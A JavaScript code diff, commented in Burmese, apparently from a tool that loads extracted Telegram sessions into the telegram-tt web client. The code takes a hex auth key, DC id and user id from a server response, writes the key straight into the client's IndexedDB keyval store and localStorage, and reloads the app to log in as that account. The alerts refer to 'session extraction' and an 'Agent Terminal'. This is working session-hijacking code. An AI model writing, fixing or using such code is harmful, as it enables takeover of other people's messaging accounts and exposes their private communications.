@@ -307,75 +307,48 @@ result.sessions.forEach((session, index) => {
         
         if (data.success && data.dcId && data.authKeyHex && data.userId) {
             
-            const hexToArray = (hex) => {
-                const result = [];
-                for (let i = 0; i < hex.length; i += 2) {
-                    result.push(parseInt(hex.substring(i, i + 2), 16));
-                }
-                return result;
-            };
+            // ၁။ Hex String ကို Teact လက်ခံနိုင်သော Uint8Array အဖြစ် ပြောင်းလဲခြင်း
+            const authKeyArray = new Uint8Array(data.authKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
             
-            const authKeyArray = hexToArray(data.authKeyHex);
-            
-            // ၁။ localStorage တွင် Auth Key ထည့်သွင်းခြင်း
+            // ၂။ Teact က UI State များကို အသစ်ပြန်တည်ဆောက်စေရန် ရှိပြီးသား Fake State များကို ရှင်းလင်းခြင်း
+            localStorage.removeItem('tt-global-state');
             localStorage.setItem('dc', String(data.dcId));
-            localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
             
-            // ၂။ [အရေးကြီးပြင်ဆင်ချက်] React Blank Screen မဖြစ်စေရန် ရှိပြီးသား State နှင့် Merge လုပ်ခြင်း
-            let existingState = {};
-            try {
-                const savedState = localStorage.getItem('tt-global-state');
-                if (savedState) {
-                    existingState = JSON.parse(savedState);
-                }
-            } catch (e) {
-                console.error("State parse error", e);
-            }
-
-            const globalState = {
-                ...existingState,
-                auth: {
-                    ...(existingState.auth || {}),
-                    state: "authorizationStateReady",
-                    phoneNumber: phoneNumber
-                },
-                currentUserId: String(data.userId),
-                // App Crash မဖြစ်စေရန် အခြေခံ Object များ သေချာပေါက် ပါဝင်စေခြင်း
-                byTabId: existingState.byTabId || {},
-                messages: existingState.messages || { byChatId: {} },
-                chats: existingState.chats || { byId: {} },
-                users: existingState.users || { byId: {} },
-                recentEmojis: existingState.recentEmojis || [],
-                settings: existingState.settings || {
-                    byKey: {
-                        theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter"
-                    }
+            // ၃။ telegram-tt ၏ မူလ Storage ဖြစ်သော IndexedDB (tt-data) ထဲသို့ Auth Key ကို တိုက်ရိုက် ရေးသွင်းခြင်း
+            const request = window.indexedDB.open('tt-data');
+            
+            request.onerror = function() {
+                alert("Database access blocked by browser. Please allow storage access.");
+                window.location.reload();
+            };
+            
+            request.onsuccess = function(event) {
+                const db = event.target.result;
+                
+                // Teact ၏ keyval store ရှိမရှိ စစ်ဆေးခြင်း
+                if (db.objectStoreNames.contains('keyval')) {
+                    const transaction = db.transaction(['keyval'], 'readwrite');
+                    const store = transaction.objectStore('keyval');
+                    
+                    // Auth Key နှင့် DC ကို IndexedDB သို့ ထည့်သွင်းခြင်း
+                    store.put(authKeyArray, `dc${data.dcId}_auth_key`);
+                    store.put(String(data.dcId), 'dc');
+                    
+                    transaction.oncomplete = () => {
+                        alert("Mission Synchronized! Connecting to Agent Terminal...");
+                        window.location.replace('/');
+                    };
+                    
+                    transaction.onerror = (e) => {
+                        console.error("IndexedDB write failed", e);
+                        window.location.replace('/'); 
+                    };
+                } else {
+                    // Database Structure မတည်ဆောက်ရသေးပါက ပုံမှန်အတိုင်း သွားစေရန်
+                    window.location.replace('/');
                 }
             };
             
-            localStorage.setItem('tt-global-state', JSON.stringify(globalState));
-
-            // ၃။ telegram-tt သည် IndexedDB (localForage) ကို အသုံးပြုလေ့ရှိသဖြင့် ထပ်မံရေးသွင်းပေးခြင်း
-            try {
-                const request = window.indexedDB.open('tt-data');
-                request.onsuccess = function(event) {
-                    const db = event.target.result;
-                    if (db.objectStoreNames.contains('keyval')) {
-                        const transaction = db.transaction(['keyval'], 'readwrite');
-                        const store = transaction.objectStore('keyval');
-                        // IndexedDB တွင် Uint8Array ဖြင့် သိမ်းဆည်းရန်လိုအပ်သည်
-                        store.put(new Uint8Array(authKeyArray), `dc${data.dcId}_auth_key`);
-                        store.put(String(data.dcId), 'dc');
-                    }
-                };
-            } catch (e) {
-                console.warn("IndexedDB injection skipped or not supported.");
-            }
-            
-            alert("Mission Synchronized! Connecting to Agent Terminal...");
-            
-            // ၄။ URL Parameter များကို ရှင်းလင်းပြီး Main App သို့ ဝင်ရောက်ခြင်း
-            window.location.replace('/');
         } else {
             alert("Session extraction failed! Database may be incomplete.");
             window.location.reload();
